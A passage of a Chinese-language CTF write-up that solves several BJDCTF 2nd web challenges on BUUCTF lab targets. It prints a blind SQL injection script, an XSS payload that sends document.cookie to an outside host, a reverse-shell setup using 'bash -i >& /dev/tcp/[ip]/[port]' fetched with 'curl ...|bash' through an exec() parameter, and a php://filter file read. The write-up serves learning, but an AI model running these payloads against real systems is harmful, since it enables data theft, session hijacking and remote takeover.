<span class="token string">"admin\\"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        payload <span class="token operator">=</span> f<span class="token string">"or/**/if(ascii(substr(password,{i},1))>{mid},1,0)#"</span>        data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"stronger"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><img src="../../../../img/image-20201011192300827.png" alt="image-20201011192300827"></p><p><img src="../../../../img/image-20201011192355368.png" alt="image-20201011192355368"></p><p>登录获取flag</p><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>.git泄露，得到index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'yds_is_so_beautiful'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>反序列化，但是没有可用的类，于是利用php内置类来反序列化</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_0" target="_blank" rel="noopener">学习文章</a></p><p>由于有个echo，所以可利用to_string(),反序列化，如<code>Error</code>（适用于php7版本），<code>Exception</code>（适用于php5、7版本）等，并且php版本为5，所以用Error</p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//8ff615f3-da70-4d1a-959f-f29d817ecd90.node3.buuoj.cn'+document.cookie&lt;/script>");</span><span class="token shell-comment comment">#$a= new Exception("</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn/?'+document.cookie);&lt;/script>");</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>直接在返回包中发现flag</p><h2 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h2><blockquote><p> b059cc88-89f4-48da-8849-893289ce611c.node3.buuoj.cn/.index.php.swp</p></blockquote><p>发现swp泄露</p><p>vim -r index.php.swp</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>珍爱网<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"how can i give you source code? .swp?!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"where is P3rh4ps's girl friend ???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$girl</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\>|\\\/'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'just girl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src='img/p3_need_beautiful_gf.png'> &lt;!-- He is p3 -->"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//duangShell~~~~</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>过滤了$，不能使用</p><blockquote><p>a=ca;b=t;c=flag;$ab $c</p></blockquote><p>过滤了base64，不能使用</p><blockquote><p>echo “Y2F0IGZsYWc=” | base64  -d</p></blockquote><p><img src="../../../../img/image-20201015000106519.png" alt="image-20201015000106519"></p><p>看了下别人的wp，发现是要反弹shell</p><p>学习链接</p><p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">1</a></p><p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">2</a></p><p>在注册一个小号，开buu的一个内网靶机，靶机的80端口是打开的，所以可以使受攻击网站服务器访问攻击机web文件</p><p>在<code>/var/www/html </code>，创建1.txt写入<code>bash</code> <code>-i &gt;&amp; ``/dev/tcp/``[ip]/[port] 0&gt;&amp;1</code>，ip为自己的ip，端口任意</p><p>然后执行<code>nc</code> <code>-lvvp [port]</code>，监听端口</p><p>在目标网站POST<code>girl_friend=curl http://[ip]/[文件名]|bash</code>，获得shell</p><p>执行<code>find / -name *flag*</code></p><p><img src="../../../../img/image-20201015173729928.png" alt="image-20201015173729928"></p><p>cat flag即可</p><h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>发现hint</p><p><img src="../../../../img/image-20201015234700542.png" alt="image-20201015234700542"></p><p>跳转到<code>http://3c135169-deae-43f6-b5e5-569e5621cf16.node3.buuoj.cn/home.php?file=system</code></p><p><img src="../../../../img/image-20201015234912712.png" alt="image-20201015234912712"></p><p>使用伪协议</p><p><code>http://3c135169-deae-43f6-b5e5-569e5621cf16.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=home</code></p><p>home.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"y1ng"</span><span class="token punctuation">,</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'your_ip_address'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\^|\~|&amp;|\|/"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.?f.?l.?a.?g.?/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.?a.?d.?m.?i.?n.?/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You! are! not! my! admin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^home$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"ç¦æ­¢å¥å¨"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/home$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/system$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".fxxkyou!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"ç°å¨è®¿é®çæ¯ "</span><span class="token punctuation">.</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">require</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>location.href='./home.php?file=system'&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>system.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Refresh:0.1;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br>~$ '</span><span class="token punctuation">;</span><span class="token variable">$str3</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br>~$ '</span><span class="token punctuation">;</span><span class="token variable">$str4</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br>~$ '</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xhtml<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>File Detector<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/normalize.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/demo.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/component.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/modernizr.custom.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>theForm<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>simform<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>system.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>simform-inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>File Detector<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>questions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>ä½ ç¥éç®å½ä¸é½æä»ä¹æä»¶å<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q1<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q1<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>è¯·è¾å¥ä½ æ³æ£æµæä»¶åå®¹é¿åº¦çurl<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q2<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q2<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>ä½ å¸æä»¥ä½ç§æ¹å¼è®¿é®ï¼<span class="token constant">GET</span>ï¼<span class="token constant">POST</span><span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q3<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>q3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>æäº¤<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>next<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token 